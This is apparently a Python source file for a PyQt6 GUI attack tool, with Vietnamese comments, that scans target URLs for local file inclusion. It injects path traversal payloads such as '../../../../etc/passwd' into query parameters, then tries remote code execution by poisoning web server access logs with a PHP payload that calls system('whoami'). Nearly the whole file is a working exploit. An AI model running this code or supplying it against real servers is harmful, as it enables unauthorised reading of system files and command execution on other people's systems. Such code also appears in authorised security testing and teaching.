import requests
import base64
import re
from urllib.parse import urlparse, parse_qs
from PyQt6.QtCore import QThread, pyqtSignal

class LFIThread(QThread):
    ket_qua_scan = pyqtSignal(str, str, str) 
    log_process = pyqtSignal(str)            
    hoan_thanh = pyqtSignal()

    def __init__(self, list_urls):
        super().__init__()
        self.targets = list_urls
        self.is_running = True
        
        #path treversal payloads
        self.payloads_file = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "./index.php", 
            "index.php"
        ]
        
        #duong dan file log
        self.log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../xampp/apache/logs/access.log",
            "../../../../var/log/apache2/access.log"
        ]
        
        # singatures 
        self.signatures = [
            b"root:x:0:0", b"[extensions]", b"[fonts]", b"<?php", b"<html>", b"JFIF", b"PNG"
        ]

        # doan ma php de check RCE
        self.rce_code = "<?php HACKED!! echo 'da RCE thanh cong'; system('whoami'); ?>"

    def run(self):
        self.log_process.emit(f"🔥 Bắt đầu tấn công {len(self.targets)} mục tiêu...")
        
        for url in self.targets:
            if not self.is_running: break
            
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)
            print(params) 
            if not params: continue

            found_lfi_param = None 

            #tan cong path traversal 
            for param_name in params:
                for payload in self.payloads_file:
                    if not self.is_running: break
                    
                    new_query_parts = []
                    for k, v in params.items():
                        if k == param_name: new_query_parts.append(f"{k}={payload}")
                        else: 
                            for val in v: new_query_parts.append(f"{k}={val}")
                    
                    attack_url = f"{base_url}?{'&'.join(new_query_parts)}"
                    
                    try:
                        res = requests.get(attack_url, timeout=5)
                        content = res.content

                        preview = content[:50].replace(b'\n', b' ').decode('utf-8', errors='ignore')
                        self.log_process.emit(f"Check Path Treversal: ...{attack_url[-40:]} | Len: {len(content)}")

                        is_vuln = False
                        
                        # Check Signature
                        for sig in self.signatures:
                            if sig in content:
                                is_vuln = True
                                break
                        
                        # Check Base64
                        if not is_vuln:
                            try:
                                possible_b64s = re.findall(b'[a-zA-Z0-9+/=]{20,}', content)
                                for b64_str in possible_b64s:
                                    decoded = base64.b64decode(b64_str)
                                    if b"<?php" in decoded or b"root:" in decoded:
                                        is_vuln = True
                                        break
                            except: pass

                        if is_vuln:
                            if "../" in payload or payload.startswith("/") or payload.startswith("..\\"):
                                vuln_type = "CÓ LỖI (PATH TRAVERSAL)"
                            else:
                                vuln_type = "CÓ LỖI (LOCAL FILE DISCLOSURE)"

                            # Phát tín hiệu lên GUI với loại lỗi đã phân loại
                            self.ket_qua_scan.emit(url, payload, vuln_type)
                            self.log_process.emit(f"<b style='color:orange'>[+] Đọc được file: {payload} - Phân loại: {vuln_type}</b>")
                            
                            found_lfi_param = param_name
                            break 
                            
                    except Exception: pass
                
                if found_lfi_param: break 

           #kiem tra RCE neu co LFI
            if found_lfi_param:
                self.log_process.emit(f"<b style='color:red'>☠️ PHÁT HIỆN LỖI! ĐANG THỬ RCE...</b>")
                
                # log poisoning
                self.log_process.emit(">> Thử Log Poisoning...")
                try:
                    # Bơm thuốc
                    headers = {'User-Agent': self.rce_code}
                    requests.get(url, headers=headers, timeout=5)
                    
                    # Kích nổ
                    for log_path in self.log_paths:
                        new_query_parts = []
                        for k, v in params.items():
                            if k == found_lfi_param: new_query_parts.append(f"{k}={log_path}")
                            else: 
                                for val in v: new_query_parts.append(f"{k}={val}")
                        exploit_url = f"{base_url}?{'&'.join(new_query_parts)}"
                        
                        res = requests.get(exploit_url, timeout=5)
                        if b"HACKED" in res.content:
                            self.ket_qua_scan.emit(url, "Log Poisoning", "RCE THÀNH CÔNG")
                            self.log_process.emit(f"<h2 style='color:red; background:yellow'>💥 RCE VIA LOG POISONING!</h2>")
                            break
                except: pass

        self.log_process.emit("🏁 Đã hoàn tất tấn công!")
        self.hoan_thanh.emit()